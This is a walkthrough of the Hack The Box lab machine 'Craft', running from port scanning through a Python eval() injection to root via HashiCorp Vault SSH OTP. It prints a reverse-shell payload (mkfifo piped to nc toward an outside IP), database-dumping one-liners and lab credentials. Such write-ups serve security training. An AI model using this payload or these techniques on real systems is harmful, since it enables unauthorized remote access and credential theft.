<div class="htb-box-info medium">
  <div class="box-header">
    <img src="https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/9e4d90d5-05bb-4795-8c39-eb15451d3100.png" alt="Machine Name">
    <div class="box-details">
      <h2>Box Info</h2>
      <table>
        <tr><td>OS:</td><td>Linux</td></tr>
        <tr><td>Difficulty:</td><td>Medium</td></tr>
        <tr><td>Release:</td><td>13 Jul 2019</td></tr>
      </table>
    </div>
  </div>
</div>


# enumeration:
```bash
nmap -p- --min-rate 1000 --open 10.129.70.7
```

```
PORT     STATE SERVICE
22/tcp   open  ssh
443/tcp  open  https
6022/tcp open  x11
```

```bash
sudo nmap -v -sV -sC -p 22,443,6022 10.129.70.7
```

```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA)
|   256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA)
|_  256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519)
443/tcp  open  ssl/http nginx 1.15.8
|_http-title: About
| ssl-cert: Subject: commonName=craft.htb/organizationName=Craft/stateOrProvinceName=NY/countryName=US
| Issuer: commonName=Craft CA/organizationName=Craft/stateOrProvinceName=New York/countryName=US
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2019-02-06T02:25:47
| Not valid after:  2020-06-20T02:25:47
| MD5:     0111 76e2 83c8 0f26 50e7 56e4 ce16 4766
| SHA-1:   2e11 62ef 4d2e 366f 196a 51f0 c5ca b8ce 8592 3730
|_SHA-256: 8828 6ef6 f2bb 87e6 58a3 f3ba 1ddf 15ef 8e97 4f3d cd81 237a c6c1 e036 3d6b 863e
|_http-server-header: nginx/1.15.8
| tls-nextprotoneg: 
|_  http/1.1
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET
6022/tcp open  ssh      Golang x/crypto/ssh server (protocol 2.0)
| ssh-hostkey: 
|_  2048 5b:cc:bf:f1:a1:8f:72:b0:c0:fb:df:a3:01:dc:a6:fb (RSA)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

add this go /etc/hosts
![[Pasted image 20261008162332.png]]

# Web

### craft.htb
![[Pasted image 20261008162549.png]]

nothing interesting here


### gogs.craft.htb
![[Pasted image 20261008162612.png]]


![[Pasted image 20261008163313.png]]

```bash
curl -H 'X-Craft-API-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsImV4cCI6MTU0OTM4NTI0Mn0.-wW1aJkLQDOE-GP5pQd3z_BJTe2Uo0jJ_mQ238P5Dqw' -H "Content-Type: application/json" -k -X POST https://api.craft.htb/api/brew/ --data '{"name":"bullshit","brewer":"bullshit", "style": "bullshit", "abv": "15.0")}'
```
didn't work...

on port 6022 i found this:
```
SSH-2.0-Go
��üÑC¤/3H C2—S¶ˆ˜4���Œcurve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1���ssh-rsa���Maes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,arcfour256,arcfour128���Maes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,arcfour256,arcfour128���Bhmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96���Bhmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96���none���none�������������v”Â±
```

# Initiall access 

then i tried some jwt basic attacks: delete signature part, change hashing algorithm to none, admin as user... but no use

no crack. hashcat didnt give anything...

anylize code more and found this:
```python
    @auth.auth_required
    @api.expect(beer_entry)
    def post(self):
        """
        Creates a new brew entry.
        """

        # make sure the ABV value is sane.
        if eval('%s > 1' % request.json['abv']):
            return "ABV must be a decimal value less than 1.0", 400
        else:
            create_brew(request.json)
            return None, 201
```
user input in eval... smell like rce.

found valid userpass in commits history:
![[Pasted image 20261009113559.png]]

here they are
```python
response = requests.get('https://api.craft.htb/api/auth/login',  auth=('dinesh', '4aUh0A8PbVJxgd'), verify=False)
```
now i want craft api token

![[Pasted image 20261009113951.png]]

All this i'll be doing from api.craft.htb domain
![[Pasted image 20261009114001.png]]

grab our token
```js
{
  "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNzkxNTM1NDkwfQ.67XTs3XuJ-bFXgdjM1Qfu77qaWxTZHN2wr-xx4M3GlI"
}
```

test this token
```bash
curl -H 'X-Craft-API-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNzkxNTM1NDkwfQ.67XTs3XuJ-bFXgdjM1Qfu77qaWxTZHN2wr-xx4M3GlI' -H "Content-Type: application/json" -k -X GET https://api.craft.htb/api/auth/check
{"message":"Token is valid!"}
```
good. it's valid.

### rce payload
now i need to create brew with malicious code to get rce...

send this request to burp to better work:
![[Pasted image 20261009115812.png]]
this didnt work, tried base64 encoding... didnt work... idk mb because of quotes or some kind of this...

but then i remembered that there is this rev shell payload without quotes...
```bash
__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.85 4444 >/tmp/f')
```

and it worked!
![[Pasted image 20261009141105.png]]

so i am in docker container cause of .dockerenv file in / dir and random hostname...

in /proc/1/environ noting interesting

so i'll return to main app folder directory

there is missing settings.py vause of .gitignore:
```python
# Flask settings
FLASK_SERVER_NAME = 'api.craft.htb'
FLASK_DEBUG = False  # Do not use debug mode in production

# Flask-Restplus settings
RESTPLUS_SWAGGER_UI_DOC_EXPANSION = 'list'
RESTPLUS_VALIDATE = True
RESTPLUS_MASK_SWAGGER = False
RESTPLUS_ERROR_404_HELP = False
CRAFT_API_SECRET = 'hz66OCkDtv8G6D'

# database
MYSQL_DATABASE_USER = 'craft'
MYSQL_DATABASE_PASSWORD = 'qLGockJ6G2J75O'
MYSQL_DATABASE_DB = 'craft'
MYSQL_DATABASE_HOST = 'db'
SQLALCHEMY_TRACK_MODIFICATIONS = False
```

### db dump
Also there is dbtest.py file. I looked how it works and created something like that, to talk with db:
```bash
python -c "
import pymysql
from craft_api import settings as s
c = pymysql.connect(host=s.MYSQL_DATABASE_HOST, user=s.MYSQL_DATABASE_USER,
                    password=s.MYSQL_DATABASE_PASSWORD, db=s.MYSQL_DATABASE_DB)
cur = c.cursor()
cur.execute('SHOW TABLES')
print(cur.fetchall())
"
```

there is 2 tables: brew and user.

lets dump everything from user table:
```bash
python -c "
import pymysql
from craft_api import settings as s
c = pymysql.connect(host=s.MYSQL_DATABASE_HOST, user=s.MYSQL_DATABASE_USER,
                    password=s.MYSQL_DATABASE_PASSWORD, db=s.MYSQL_DATABASE_DB)
cur = c.cursor()
cur.execute('Select * from user')
print(cur.fetchall())
"
```

output:
```bash
((1, 'dinesh', '4aUh0A8PbVJxgd'), (4, 'ebachman', 'llJ77D8QFkLPQB'), (5, 'gilfoyle', 'ZEU3N8WNM2rh4T'))
```

tried this creds on ssh, but no use... then i tried to auth into gogs. and the last one worked... got into gogs as gilfoyle:
![[Pasted image 20261009145919.png]]

so he has this private repo called craft-infra. I opened it and found .ssh folder. In there was id_rsa that i grabbed:

also browsing through this repo found new subdomain. `vault.craft.htb`. but it didnt show noting... only 404... 
![[Pasted image 20261009150551.png]]

so let's ssh in.
![[Pasted image 20261009152242.png]]
got in... passphrase was his password.

# Privilege escalation through vault abuse

there is some .vault-token file... digging more into it I found info what it is.
![[Pasted image 20261009160600.png]]

What is Vault?
> Vault provides centralized, well-audited privileged access and secret management for mission-critical data whether you deploy systems on-premises, in the cloud, or in a hybrid environment.
> 
> With a modular design based around a growing plugin ecosystem, Vault lets you integrate with your existing systems and customize your application workflow.

there is cli tool called vault

![[Pasted image 20261009161005.png]]

Then i tried to understand how it works...

this I found in craft-infra repo... very interesting
![[Pasted image 20261009161034.png]]

lets try to read this secret idk
![[Pasted image 20261009161119.png]]

browsing trough net and talking to ai. i found this command to request OTP password:
```bash
vault write ssh/creds/root_otp ip=10.129.70.107
```
copy it and  ssh in as root:
![[Pasted image 20261009163841.png]]
